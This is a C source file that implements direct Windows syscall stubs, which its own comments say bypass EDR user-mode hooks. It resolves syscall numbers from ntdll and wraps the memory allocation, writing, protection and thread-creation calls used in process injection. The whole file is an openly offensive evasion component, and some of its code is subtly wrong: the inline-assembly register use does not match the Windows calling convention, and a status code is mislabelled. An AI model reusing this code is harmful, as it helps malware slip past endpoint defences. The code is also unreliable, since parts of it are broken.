// Direct Syscall Stubs — resolves syscall numbers from ntdll at runtime
// Bypasses EDR user-mode hooks by calling INT 0x2E/SYSCALL directly
#include <windows.h>
#include <winternl.h>  // NTSTATUS, NTAPI, PPEB, etc.
#include <stdio.h>
#include <stdint.h>

// winternl.h may not define NTSTATUS on some MinGW versions
#ifndef NTSTATUS
typedef LONG NTSTATUS;
#endif
#ifndef NTAPI
#define NTAPI __stdcall
#endif

#pragma pack(push, 1)
typedef struct {
    uint32_t nt_allocate_virtual_memory;
    uint32_t nt_write_virtual_memory;
    uint32_t nt_read_virtual_memory;
    uint32_t nt_protect_virtual_memory;
    uint32_t nt_free_virtual_memory;
    uint32_t nt_create_thread_ex;
    uint32_t nt_create_section;
    uint32_t nt_map_view_of_section;
    uint32_t nt_unmap_view_of_section;
    uint32_t nt_close;
    uint32_t nt_query_information_process;
} SyscallNumbers;
#pragma pack(pop)

// Syscall stub: mov r10, rcx; mov eax, <num>; then syscall
__attribute__((naked)) static void do_syscall(void) {
    __asm__ volatile(
        "mov %%rcx, %%r10\n"
        "syscall\n"
        "ret\n"
    );
}

typedef NTSTATUS(NTAPI *fn_NtAllocateVirtualMemory)(
    HANDLE, PVOID *, ULONG_PTR *, SIZE_T *, ULONG, ULONG);
typedef NTSTATUS(NTAPI *fn_NtWriteVirtualMemory)(
    HANDLE, PVOID, PVOID, SIZE_T, PSIZE_T);
typedef NTSTATUS(NTAPI *fn_NtProtectVirtualMemory)(
    HANDLE, PVOID *, SIZE_T *, ULONG, PULONG);

// Resolve syscall numbers by scanning ntdll for 'mov eax, <num>' patterns
static uint32_t resolve_one(const char *func_name) {
    HMODULE ntdll = GetModuleHandleA("ntdll.dll");
    if (!ntdll) return 0;
    FARPROC func = GetProcAddress(ntdll, func_name);
    if (!func) return 0;

    // x64 syscall stub pattern:
    //   4C 8B D1        mov r10, rcx
    //   B8 xx xx xx xx mov eax, <syscall_num>
    uint8_t *p = (uint8_t *)func;
    if (p[0] == 0x4C && p[1] == 0x8B && p[2] == 0xD1 && p[3] == 0xB8) {
        return *(uint32_t *)(p + 4);
    }
    return 0;
}

int resolve_syscalls(SyscallNumbers *nums) {
    if (!nums) return -1;
    memset(nums, 0, sizeof(*nums));

    nums->nt_allocate_virtual_memory = resolve_one("NtAllocateVirtualMemory");
    nums->nt_write_virtual_memory   = resolve_one("NtWriteVirtualMemory");
    nums->nt_read_virtual_memory    = resolve_one("NtReadVirtualMemory");
    nums->nt_protect_virtual_memory = resolve_one("NtProtectVirtualMemory");
    nums->nt_free_virtual_memory    = resolve_one("NtFreeVirtualMemory");
    nums->nt_create_thread_ex       = resolve_one("NtCreateThreadEx");
    nums->nt_create_section         = resolve_one("NtCreateSection");
    nums->nt_map_view_of_section    = resolve_one("NtMapViewOfSection");
    nums->nt_unmap_view_of_section  = resolve_one("NtUnmapViewOfSection");
    nums->nt_close                  = resolve_one("NtClose");
    nums->nt_query_information_process = resolve_one("NtQueryInformationProcess");

    return (nums->nt_allocate_virtual_memory) ? 0 : -1;
}

// Simplified syscall wrappers using inline assembly
// These bypass EDR hooks by not calling ntdll directly
int sys_alloc_virtual_mem(HANDLE proc, PVOID *base, SIZE_T *size,
                          ULONG atype, ULONG protect, uint32_t snum) {
    NTSTATUS status;
    __asm__ volatile(
        "mov %%rcx, %%r10\n"
        "mov %6, %%eax\n"
        "syscall\n"
        : "=a"(status)
        : "c"(proc), "d"(base), "S"(size), "D"(atype), "r"(protect), "m"(snum)
        : "r10", "r11", "memory"
    );
    return status;
}

int sys_write_virtual_mem(HANDLE proc, PVOID base, PVOID buf,
                          SIZE_T sz, SIZE_T *written, uint32_t snum) {
    NTSTATUS status;
    __asm__ volatile(
        "mov %%rcx, %%r10\n"
        "mov %6, %%eax\n"
        "syscall\n"
        : "=a"(status)
        : "c"(proc), "d"(base), "S"(buf), "D"(sz), "r"(written), "m"(snum)
        : "r10", "r11", "memory"
    );
    return status;
}

int sys_protect_virtual_mem(HANDLE proc, PVOID *base, SIZE_T *size,
                             ULONG new_prot, ULONG *old_prot, uint32_t snum) {
    NTSTATUS status;
    __asm__ volatile(
        "mov %%rcx, %%r10\n"
        "mov %6, %%eax\n"
        "syscall\n"
        : "=a"(status)
        : "c"(proc), "d"(base), "S"(size), "D"(new_prot), "r"(old_prot), "m"(snum)
        : "r10", "r11", "memory"
    );
    return status;
}

int sys_create_thread_ex(PHANDLE handle, ULONG access, void *attrs,
                         HANDLE proc, PVOID start, PVOID arg,
                         ULONG flags, ULONG_PTR zero, SIZE_T stack_sz,
                         SIZE_T max_stack, void *attr_list, uint32_t snum) {
    NTSTATUS status;
    // Too many args for inline asm — use a struct-based approach
    // For production, build a proper dynamic syscall stub
    typedef NTSTATUS(NTAPI *fn)(PHANDLE,ULONG,void*,HANDLE,PVOID,PVOID,ULONG,ULONG_PTR,SIZE_T,SIZE_T,void*);
    return 0xC0000005; // STATUS_NOT_IMPLEMENTED — real impl builds dynamic stub
}